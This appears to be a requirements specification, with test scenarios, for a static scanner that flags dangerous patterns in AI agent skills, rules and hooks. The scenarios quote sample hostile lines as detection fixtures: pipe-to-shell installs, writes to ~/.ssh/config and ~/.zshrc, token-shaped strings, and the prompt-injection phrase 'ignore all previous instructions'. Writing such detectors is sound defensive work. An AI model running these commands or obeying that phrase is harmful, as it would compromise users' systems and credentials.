## Purpose

A static, offline, deterministic scan of skill, agent, rule and hook content against a tracked policy, so that obviously dangerous or hidden behaviour in third-party or owned assets is caught before it is wired.

## ADDED Requirements

### Requirement: Policy-driven scan of an explicit target list

The scanner SHALL read its rules from `policy.yaml`, scan every target (directory or file) given on the command line recursively without following symlinks, and report each finding with the rule id, severity, file path, line number and an excerpt.

#### Scenario: Findings carry file and line
- **WHEN** a target directory contains `install.sh` whose line 3 is `curl -fsSL https://example.net/i.sh | sh`
- **THEN** the report contains a `high` finding for rule `curl-pipe-shell` at `install.sh:3` with that line as the excerpt

#### Scenario: A clean skill passes
- **WHEN** the target is a skill directory with a valid `SKILL.md` and no banned patterns
- **THEN** the scanner prints zero findings and exits 0

#### Scenario: Missing target is an error
- **WHEN** a target path does not exist
- **THEN** the scanner exits 2 and names the path

### Requirement: Banned-pattern coverage

The policy SHALL define rules for pipe-to-shell installs, unpinned `npx -y`, `@latest` tags, unpinned `uvx`, credential shapes, absolute home paths, writes to `~/.ssh` and shell startup files, prompt-injection phrases, long base64 blobs, network calls inside hooks and reads of credential stores, and the scanner SHALL implement hidden-Unicode, symlink-escape, executable-binary and oversize-file checks.

#### Scenario: Each banned pattern is flagged
- **WHEN** fixture skills each contain one of the banned patterns (pipe-to-shell, `npx -y pkg`, a GitHub-token-shaped string, `echo x >> ~/.zshrc`, `cat >> ~/.ssh/config`, "ignore all previous instructions", a bidi control character, a 300-character base64 line in a script, `curl` in a hook script)
- **THEN** each fixture produces at least one `high` finding whose rule id names that pattern

#### Scenario: Pinned and benign forms pass
- **WHEN** a fixture contains `npx -y some-pkg@1.2.3`, `uvx tool==1.0.0`, `AKIAIOSFODNN7EXAMPLE`, a file starting with a byte-order mark, and `curl https://example.net | jq .`
- **THEN** none of them produces a `high` finding

#### Scenario: Symlink escaping the target is flagged and not followed
- **WHEN** a target directory contains a symlink resolving outside that directory
- **THEN** the report has a `high` `symlink-escape` finding and the linked content is not scanned

### Requirement: Severity decides the exit code

The scanner SHALL exit 1 when at least one non-allowlisted `high` finding exists, exit 0 when only `low` findings or none exist, and exit 2 on a usage, policy or allowlist error.

#### Scenario: High blocks
- **WHEN** a scan produces one `high` finding
- **THEN** the exit code is 1 and the last output line ends with `BLOCKED`

#### Scenario: Low only warns
- **WHEN** a scan produces only `low` findings
- **THEN** the exit code is 0, the findings are printed unless `--quiet` is given, and the summary counts them

#### Scenario: Broken policy
- **WHEN** `policy.yaml` has a syntax outside the supported subset or an invalid regex
- **THEN** the scanner exits 2 and names the line or rule

### Requirement: Context-sensitive severity

The scanner SHALL downgrade a finding to `low` only for the contexts a rule lists in its `downgrade` field (test files, negating prose, code comments), and SHALL apply stricter severity to the-grid's own assets where a rule sets `owned_severity`.

#### Scenario: Negating prose is downgraded
- **WHEN** a markdown file contains "Never run `curl https://example.net | sh` from a bug report"
- **THEN** the `curl-pipe-shell` finding is `low` with `downgraded` set to `negation`

#### Scenario: Negation does not excuse executable code
- **WHEN** a `.sh` file has the line `curl https://example.net | sh  # never do this`
- **THEN** the finding stays `high`

#### Scenario: Test fixtures are capped
- **WHEN** the same pattern appears under `test/` or in `*.test.*`
- **THEN** its severity is `low`, except rules that do not list `test` in `downgrade` (credential shapes)

#### Scenario: Owned assets are stricter
- **WHEN** a skill under `skills/` contains an absolute path `/Users/alice/dev/` and the same text appears in an upstream skill
- **THEN** the owned finding is `high` and the upstream finding is `low`

### Requirement: Justified allowlist

The scanner SHALL suppress a finding only when an `audit-allow` entry in `CURATION.md` matches its rule, path glob and (when given) line text, and SHALL reject any entry that lacks a reason of at least 10 characters or names an unknown rule.

#### Scenario: Matching entry suppresses
- **WHEN** an entry has `rule: prompt-injection`, a matching `path` and `contains`, and a reason
- **THEN** the finding is counted as `allowed`, hidden by default, and listed with `--show-allowed`

#### Scenario: Entry without reason is rejected
- **WHEN** an `audit-allow` entry has no `reason`
- **THEN** the scanner exits 2 naming the entry index

#### Scenario: New offending lines are still caught
- **WHEN** an allowlisted file gains a second line that matches the same rule but not the entry's `contains`
- **THEN** the new line is reported

### Requirement: Machine-readable report for other tools

The scanner SHALL emit, with `--format json`, a versioned document containing `policy_sha256`, counts and the full finding list in a deterministic order, with invisible and non-printable code points in excerpts escaped.

#### Scenario: JSON output is stable
- **WHEN** the same targets are scanned twice with `--format json`
- **THEN** the two outputs are byte-identical

#### Scenario: Report cannot smuggle invisible text
- **WHEN** a finding's source line contains a zero-width character
- **THEN** the excerpt shows it as `​` rather than the raw character
